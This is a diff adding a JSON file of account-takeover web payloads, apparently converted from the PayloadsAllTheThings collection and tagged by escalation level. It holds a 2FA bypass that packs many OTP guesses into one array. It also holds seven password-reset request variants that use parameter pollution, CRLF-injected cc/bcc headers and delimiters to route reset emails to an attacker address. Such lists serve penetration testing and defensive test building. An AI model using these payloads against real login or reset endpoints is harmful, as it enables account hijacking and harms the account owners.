@@ -1,0 +1,38 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "account_takeover",
+  "original_category": "Account Takeover",
+  "payloads": [
+    {
+      "category": "Bypass 2FA with array",
+      "escalation": "aggressive",
+      "lines": [
+        "{",
+        "\"otp\":[",
+        "\"1234\",",
+        "\"1111\",",
+        "\"1337\", // GOOD OTP",
+        "\"2222\",",
+        "\"3333\",",
+        "\"4444\",",
+        "\"5555\"",
+        "]",
+        "}"
+      ]
+    },
+    {
+      "category": "Password Reset via Email Parameter",
+      "escalation": "baseline",
+      "lines": [
+        "email=victim@mail.com&email=hacker@mail.com",
+        "{\"email\":[\"victim@mail.com\",\"hacker@mail.com\"]}",
+        "email=victim@mail.com%0A%0Dcc:hacker@mail.com",
+        "email=victim@mail.com%0A%0Dbcc:hacker@mail.com",
+        "email=victim@mail.com,hacker@mail.com",
+        "email=victim@mail.com%20hacker@mail.com",
+        "email=victim@mail.com|hacker@mail.com"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.867Z"
+}
